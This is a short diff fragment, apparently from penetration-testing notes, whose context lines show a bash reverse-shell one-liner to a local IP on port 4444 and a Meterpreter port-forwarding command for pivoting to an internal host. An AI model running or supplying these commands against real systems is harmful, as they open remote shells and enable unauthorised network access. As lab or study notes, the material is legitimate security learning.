@@ -155,6 +155,8 @@ run
 sh -i >& /dev/tcp/192.168.0.181/4444 0>&1
 ```
 
+
+
 pivoting by portforgarding 
 ```python
 portfwd add -l 7777 -p 21 -r 10.0.2.5
